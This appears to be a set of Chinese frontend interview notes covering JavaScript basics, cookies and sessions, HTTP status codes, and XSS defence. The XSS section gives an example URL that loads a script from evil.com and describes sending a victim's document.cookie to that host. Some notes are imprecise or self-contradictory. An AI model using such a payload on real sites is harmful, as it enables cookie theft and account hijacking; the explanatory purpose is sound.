## 常见前端面试题整理

### HTML

### CSS

### javascript

> js数据类型

基本数据类型：Undefined, Null, Boolean, Number, String, Symbol

复杂数据类型：Object

函数Function 是对象不是基本数据类型。  
但是typeof 操作符能够区分。  
`hint: typeof null == object.`

> js 原型和原型链的概念

`原型`是指prototype属性。并不是所有对象都有prototype属性的。  
prototype是每个function自带的属性。  

function的prototype 指向了其原型对象。  
原型对象的constructor 指向了function。

function new出来的对象，其\__proto\__属性指向了原型对象。

`原型链`的概念。
在js中，每个对象都有\__proto__属性指向原型对象，而原型对象也等于另一个类型的实例，因此它也包含指向另一个原型的指针。因而形成原型链。

原型链的顶端是null.
```javascript
Object.prototype.__proto__ === null;
Object.prototype 处于原型链的第二个
```

原型链用于实现继承。把一个函数的原型对象赋值为另一个函数的实例。

> js 变量提升

```javascript
var a = 'bbb';
// 即
var a;  // 提升至作用域顶部
a = 'bbb';
```


> js bind apply、call 的作用与区别

call 和apply 用于指定this的上下文。  
但是接受的参数不太一样。apply接受的第二个参数为数组
```javascript
var m = { x: 1 }
function foo (y) { console.log(this.x + y); }

foo.call(m, 5);
foo.apply(m, [5]);  

foo = foo.bind(m);  // bind之后能够作为函数来调用；返回新函数
foo(5)
```

> js 闭包概念

内部的function可以访问外部function的变量。因此当函数里返回一个函数的时候，内部的函数可以一直使用外部函数的变量一直到内部函数结束。从而实现变量私有化。

最简单的闭包
```javascript
function a () {
  var tmp = 1;
  return function b(value) {
    console.log(tmp + value)
  }
}
var c = new a();
c(2) // 3
```
闭包常见loop问题
```javascript
function createFun() {
  var result = new Array();
  for (var i = 0; i < 10; i++) {
    result[i] = function(num) {
      return function() {
        console.log(num);
      };
    }(i);
  }
  return result;
}
```

### HTTP
> cookie session 的实现和区别

由于HTTP是无状态协议，因此服务端需要记录用户的状态时，需要session机制来识别具体的用户。服务端为每个用户创建了特定的session，用于标示这个用户。  
在服务端保存session的方式有几种，常见的是，内存，数据库，和文件。

cookie是客户端保存用户信息的机制。session的实现一般需要在客户端的cookie存放一个sessionId。如果客户端禁用了cookie，那么就可以使用url重写来进行会话跟踪。

Web 服务器通过发送一个称为 Set-Cookie 的 HTTP 消息头来创建一个 cookie.
```javascript
Set-Cookie: value[; expires=date][; domain=domain][; path=path][; secure]
```

当存在一个 cookie，并允许设置可选项，该 cookie 的值会在随后的每次请求中被发送至服务器，cookie 的值被存储在名为 Cookie 的 HTTP 消息头中，并且只包含了 cookie 的值，忽略全部设置选项。
```javascript
Cookie: value1; value2; name1=value1
```
在js中，通过 document.cookie来获取cookie的值。
但是如果cookie的属性被设置成了HttpOnly,那么使用document.cookie也获取不到那个被设置为HttpOnly的cookie的值。
expires属性描述了cookie的过期时间

> Content-Type有哪些取值

 application/json
> Http状态码

100-199 信息性状态码

200-299 成功状态码  

300-399 重定向状态码 301永久移除  304 Not Modified

400-499 客户端错误 401没认证 404 Not Found

500-599 服务端错误 500服务器错误  502 Bad GateWay

### web安全

> xss攻击

跨站脚本攻击。cross site script 

常见的xss攻击方式: 在url中通过参数向服务端传入html 

例如 <img onerror="js code"> 从而执行js代码

或者在评论框之类处评论携带 攻击性的 代码。如果dom元素未转义，那么代码就会被执行。



防御措施：

1、编码，对输入数据进行 HTML Entity 编码。

​ 2、过滤；

+ 过滤上传的dom属性，比如onerror onclick等
+ 移除用户上传的style script iframe节点等

xss攻击成功了之后，常见的操作是获取用户的cookie，因为cookie存放了当前用户的登录凭证。从而发起cookie劫持。

3、校正。

+ 避免对HTML Entity进行编码。因为会影响正常用户的一些数据
+ 使用Dom Parse转换，矫正不配对的Dom标签。

举例：

http://www.a.com/test.htm?abc="><script src=http://evil.com/evil.js></script>

当用户点击这个链接的时候，黑客可以在evil.js中，创建一个图片，并把它的src设置为http://evil.com/document.cookie  从而在服务器的web记录中获取到它的cookie.





### 数据结构

### 算法
